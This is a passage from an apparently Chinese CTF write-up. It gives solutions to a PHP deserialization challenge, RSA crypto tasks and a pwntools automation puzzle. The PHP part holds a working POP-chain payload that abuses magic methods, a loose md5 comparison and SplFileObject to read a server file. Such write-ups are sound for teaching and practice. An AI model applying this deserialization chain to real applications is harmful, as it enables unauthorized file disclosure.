        if (md5(md5($this->fruit11)) == 666) {
            return $this->fruit10->hey;
        }
    }
}






$b=new CherryBlossom();
$b->fruit1=new CherryBlossom();
$b->fruit1->fruit2=new Philosopher();
$b->fruit1->fruit2->fruit10=new Mystery();

$c=serialize($b);
echo $c;
```

![image-20250312204706054](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503122047127.png)

我们利用SplFileObject类来读取文件

```php
<?php

error_reporting(0);

class CherryBlossom
{
    public $fruit1;
    public $fruit2;



    function __destruct()
    {
        echo $this->fruit1;
    }

    public function __toString()
    {
        $newFunc = $this->fruit2;
        return $newFunc();
    }
}




class Mystery
{

    public $SplFileObject="/flag44545615441084";

    public function __get($arg1)
    {
        array_walk($this, function ($day1, $day2) {
            $day3 = new $day2($day1);
            foreach ($day3 as $day4) {
                echo($day4 . '<br>');
            }
        });
    }
}



class Philosopher
{
    public $fruit10;
    public $fruit11="rSYwGEnSLmJWWqkEARJp";

    public function __invoke()
    {
        if (md5(md5($this->fruit11)) == 666) {
            return $this->fruit10->hey;
        }
    }
}






$b=new CherryBlossom();
$b->fruit1=new CherryBlossom();
$b->fruit1->fruit2=new Philosopher();
$b->fruit1->fruit2->fruit10=new Mystery();

$c=serialize($b);
echo $c;
```

得到flag

![image-20250312204802896](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503122048951.png)







### crypto

#### baby_signin

解一

```py
from Crypto.Util.number import getPrime, bytes_to_long
p=getPrime(128)
q=getPrime(128)
n=p*q
phi=(p-1)*(q-1)
flag="NSSCTF{xxxxxx}"
print("p=",p)
print("q=",q)
m=bytes_to_long(flag.encode())
e=4
c=pow(m,e,n)
print("c=",c)
print("n=",n)
'''
p= 182756071972245688517047475576147877841
q= 305364532854935080710443995362714630091
c= 14745090428909283741632702934793176175157287000845660394920203837824364163635
n= 55807222544207698804941555841826949089076269327839468775219849408812970713531
'''

```

![image-20250305203130294](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503052031849.png)

```py
#sage
R.<x> = Zmod(p)[]
f = x ^ e - c
f = f.monic()
res1 = f.roots()
print('res1 =',res1)
R.<x> = Zmod(q)[]
f = x ^ e - c
f = f.monic()
res2 = f.roots()
print('res2 = ',res2)
 
'''
这段代码是在Sage数学软件中运行的，用于求解一个在模质数p意义下的方程x^e=c的解。
代码定义了一个多项式环R，请注意 R.<x> = Zmod(p)[] 这一句。这里 R 表示多项式环的名称，<x> 表示所定义的环中的变量名是x，而 Zmod(p)[] 表示在模p的意义下定义了一个多项式。其中每个多项式的系数都是p的倍数，以确保在模p的意义下进行运算时不会出现浮点运算精度的问题。
接下来，代码定义了一个多项式 f = x^e - c。变量c和e在代码中的定义可能来自其他地方。通过将这个方程的领导系数归一化，再去除它，这个多项式被调整为monic的形式，并被保存在变量f中，以便计算方程的根。
接下来，代码再次调用了多项式 f 的roots() 方法，这一次将得到方程的一个根的列表。具体地，最终生成的变量res1是多项式f在模p意义下的根列表。注意，如果方程没有解，则res1变量将为空列表。
'''
--

```

然后使用中国剩余定理

```py
import libnum
res1 = [(129837097923395210801798309962414834552, 1), (93313355184984066083236894659279572056, 1), (89442716787261622433810580916868305785, 1), (52918974048850477715249165613733043289, 1)]
res2 =  [(261934047942669636570395955764280435960, 1), (43430484912265444140048039598434194131, 1)]
p= 182756071972245688517047475576147877841
q= 305364532854935080710443995362714630091
c= 14745090428909283741632702934793176175157287000845660394920203837824364163635
n= 55807222544207698804941555841826949089076269327839468775219849408812970713531
e=4

for i in res1:
    for j in res2:
        # 中国剩余定理
        m = libnum.solve_crt([int(i[0]), int(j[0])], [p, q])  # c3=libnum.solve_crt([c1,c2], [q1,q2])
        flag = libnum.n2s(int(m))
        print(flag)

```

得到flag

官方解：

_[litctf 2023\]e的学问-CSDN博客](https://blog.csdn.net/l2ohvef/article/details/139840219)

```py
from sympy.ntheory.residue_ntheory import sqrt_mod
from sympy.ntheory.modular import crt

p = 182756071972245688517047475576147877841
q = 305364532854935080710443995362714630091
n = p * q
c = 14745090428909283741632702934793176175157287000845660394920203837824364163635
c_p = c % p
c_q = c % q
def find_quartic_roots(c_val, p_val):
    roots = set()
    y_roots = sqrt_mod(c_val, p_val, all_roots=True)
    for y in y_roots:
        x_roots = sqrt_mod(y, p_val, all_roots=True)
        roots.update(x_roots)
    return roots
roots_p = find_quartic_roots(c_p, p)
roots_q = find_quartic_roots(c_q, q)

possible_ms = []
for xp in roots_p:
    for xq in roots_q:
        m, _ = crt([p, q], [xp, xq])
        possible_ms.append(m)
for m in possible_ms:
    try:
        flag = bytes.fromhex(hex(m)[2:]).decode('utf-8')
        if flag.startswith('NSSCTF{'):
            print("Flag found:", flag)
            break
    except:
        continue
```

#### baby_factor

RSA模板

```py
n=2741832985459799195551463586200496171706401045582705736390510500694289553647578857170635209048629428396407631873312962021354740290808869502374444435394061448767702908255197762575345798570340246369827688321483639197634802985398882606068294663625992927239602442735647762662536456784313240499437659967114509197846086151042512153782486075793224874304872205720564733574010669935992016367832666397263951446340260962650378484847385424893514879629196181114844346169851383460163815147712907264437435463059397586675769959094397311450861780912636566993749356097243760640620004707428340786147078475120876426087835327094386842765660642186546472260607586011343238080538092580452700406255443887820337778505999803772196923996033929998741437250238302626841957729397241851219567703420968177784088484002831289722211924810899441563382481216744212304879717297444824808184727136770899310815544776369231934774967139834384853322157766059825736075553
phi=2741832985459799195551463586200496171706401045582705736390510500694289553647578857170635209048629428396407631873312962021354740290808869502374444435394061448767702908255197762575345798570340246369827688321483639197634802985398882606068294663625992927239602442735647762662536456784313240499437659967114509197784246608456057052779643060628984335578973450260519106769911425793594847759982583376628098472390090331415895352869275325656949958242181688663465437185437198392460569653734315961071709533645370007008616755547195108861900432818710027794402838336405197750190466425895582236209479543326147804766393022786785337752319686125574507066082357748118175068545756301823381723776525427724798780890160482013759497102382173931716030992837059880049832065500252713739288235410544982532170147652055063681116147027591678349638753796122845041417275362394757384204924094885233281257928031484806977974575497621444483701792085077113227851520
c=2675023626005191241628571734421094007494866451142251352071850033504791090546156004348738217761733467156596330653396106482342801412567035848069931148880296036606611571818493841795682186933874790388789734748415540102210757974884805905578650801916130709273985096229857987312816790471330181166965876955546627327549473645830218664078284830699777113214559053294592015697007540297033755845037866295098660371843447432672454589238297647906075964139778749351627739005675106752803394387612753005638224496040203274119150075266870378506841838513636541340104864561937527329845541975189814018246183215952285198950920021711141273569490277643382722047159198943471946774301837440950402563578645113393610924438585345876355654972759318203702572517614743063464534582417760958462550905093489838646250677941813170355212088529993225869303917882372480469839803533981671743959732373159808299457374754090436951368378994871937358645247263240789585351233
 
print(long_to_bytes(pow(c,pow(65537,-1,phi),n)))
 
# NSSCTF{W0W!!_Y0u_4r3_g00d_G03!!!}
```

### MISC

#### mycode

利用pwntools工具进行自动化解题

```py
from pwn import *
from functools import cmp_to_key

# 配置项
website = "node2.anna.nssctf.cn"
port = 28129  # 实际端口
if_32 = False  # 根据需要设置是否为32位
pg = p32 if if_32 else p64
ug = u32 if if_32 else u64

# 设置调试信息和架构
context(log_level="debug", arch="i386" if if_32 else "amd64", os="linux")
p = remote(website, port)

# 自定义比较函数
def compare(a, b):
    # 比较拼接结果 a+b 和 b+a 的字典顺序
    if a + b < b + a:
        return -1
    else:
        return 1

# 发送并清理函数
def send_after_clean(content: bytes = b"", until: bytes = None, timeout: float = 0.05, no_show: bool = True):
    try:
        if until is not None:
            p.recvuntil(flat(until))
        else:
            received = p.clean(timeout)
            if not no_show:
                print(f"[$]received:\n{received.decode('UTF-8')}")
        p.send(flat(content))
    except Exception as e:
        print(f"[!]Error in send_after_clean: {e}")

# 发送一行并清理
def sendline_after_clean(content: bytes = b"", until: bytes = None, timeout: float = 0.05, no_show: bool = True):
    send_after_clean([content, p.newline], until, timeout, no_show)

# 进入交互模式并清理
def interactive_after_clean(timeout: int = 0.05, no_show: bool = True):
    try:
        received = p.clean(timeout)
        if not no_show:
            print(f"[$]received:\n{received}")
        p.interactive()
    except Exception as e:
        print(f"[!]Error in interactive_after_clean: {e}")

# 处理题目并返回答案
def solve_question():
    try:
        # 获取题目，直到遇到"Smallest:"标记
        question = p.recvuntil(b"\n")
        
        # 提取题目中的数字部分
        question_str = question.decode('utf-8').strip().split(":")[1].strip()  # 提取数字部分
        nums_str = question_str.split()  # 提取所有数字

        # 使用你提供的拼接最小数字的代码
        def compare(a, b):
            if a + b < b + a:
                return -1
            else:
                return 1

        sorted_nums = sorted(nums_str, key=cmp_to_key(compare))
        result = ''.join(sorted_nums)

        # 处理前导零
        result = result.lstrip('0')
        if not result:
            print('0')
        else:
            print(result)
        
        # 发送答案
        sendline_after_clean(result.encode(), "Smallest:")
        
    except Exception as e:
        print(f"[!]Error while processing question: {e}")

# 自动解决所有题目
while True:
    solve_question()

# 进入人机交互模式
interactive_after_clean()

```

参考：https://peterliuzhi.top/tricks/%E4%BD%BF%E7%94%A8pwntools%E4%B8%8E%E8%BF%9C%E7%A8%8B%E4%BA%A4%E4%BA%92%E8%A7%A3misc%E6%95%B0%E5%AD%A6%E9%A2%98/

```
import java.util.Scanner;

public class shuzu {

    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        int[]arr=new int[5];
        for(int i=0;i<arr.length;i++){
            arr[i]=sc.nextInt();
        }
        int start = 0;
        int end = arr.length - 1;
        while (start < end) {
            // 交换位置
            int temp = arr[start];
            arr[start] = arr[end];
            arr[end] = temp;
            start++;
            end--;
        }

        for (int j : arr) {
            System.out.println(j);
        }

    }


}

```

